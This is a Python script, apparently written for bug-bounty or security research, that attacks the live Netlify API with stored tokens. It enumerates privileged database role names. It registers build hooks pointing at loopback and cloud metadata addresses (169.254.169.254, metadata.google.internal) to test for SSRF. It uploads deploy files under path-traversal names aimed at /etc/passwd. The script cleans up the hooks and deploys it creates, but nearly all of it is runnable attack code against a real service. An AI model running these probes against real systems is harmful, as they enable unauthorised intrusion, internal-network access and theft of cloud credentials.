# -*- coding: utf-8 -*-
"""A: draft deploy files 路径穿越 / B: database ?role 枚举 / C: build_hooks URL 校验"""
import http.client, ssl, gzip, brotli, json, sys, re, time, random, string
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, TOKEN_B

ctx = ssl.create_default_context()
SITE_A = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'

def req(method, path, body=None, token=TOKEN_A, timeout=25, ctype='application/json'):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json'}
    if body is not None:
        h['Content-Type'] = ctype
    if token: h['Authorization'] = 'Bearer ' + token
    b = json.dumps(body).encode() if isinstance(body, (dict, list)) else body
    conn.request(method, path, body=b, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    st = r.status
    txt = raw.decode('utf-8', 'ignore')
    conn.close()
    return st, txt

def probe(tag, m, p, body=None, tok=TOKEN_A, ct='application/json'):
    st, b = req(m, p, body, tok, ctype=ct)
    print('%-66s %s | %s' % (tag, st, b[:200].replace('\n', ' ')))
    return st, b

print('== B. database ?role= 枚举 ==')
for role in ['netlifydb_owner', 'owner', 'admin', 'readonly', 'reader', 'migration',
             'app', 'service', 'netlifydb', 'default', 'superuser', 'analytics']:
    st, b = probe('GET database?role=%s' % role, 'GET',
                  '/api/v1/sites/%s/database?role=%s' % (SITE_A, role))
print()
print('== C. build_hooks URL 校验 ==')
rnd = ''.join(random.choices(string.ascii_lowercase, k=6))
for url in ['https://example.com/hook-%s' % rnd,
            'http://127.0.0.1:8000/x',
            'http://169.254.169.254/latest/meta-data/',
            'http://[::1]:80/x',
            'http://0.0.0.0/x',
            'http://metadata.google.internal/']:
    st, b = probe('POST hook url=%s' % url[:40], 'POST', '/api/v1/sites/%s/build_hooks' % SITE_A,
                  {'title': 'zz-hook-%s' % rnd, 'url': url})
    if st in (200, 201):
        try:
            hid = json.loads(b).get('id')
            if hid:
                req('DELETE', '/api/v1/sites/%s/build_hooks/%s' % (SITE_A, hid))
        except Exception:
            pass
print()
print('== A. draft deploy + files 穿越 ==')
st, b = probe('POST deploys draft', 'POST', '/api/v1/sites/%s/deploys' % SITE_A, {'draft': True})
did = None
try:
    did = json.loads(b).get('id')
    print('draft deploy id:', did)
except Exception:
    pass
if did:
    for p in ['../../../../../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
              '..%2f..%2fetc%2fpasswd', '/abs/etc/passwd', '..\\..\\etc\\passwd',
              'sub/../index.html', 'index.html']:
        pp = '/api/v1/deploys/%s/files/%s' % (did, p)
        st, b = probe('PUT file %s' % p[:30], 'PUT', pp, b'ROOT:%s:0:0:test' % p.encode(), ct='text/plain')
    # 读回文件清单
    st, b = probe('GET deploy files', 'GET', '/api/v1/deploys/%s/files' % did)
    # 清理 draft deploy
    st, b = probe('DELETE draft deploy', 'DELETE', '/api/v1/deploys/%s' % did)
print('done')
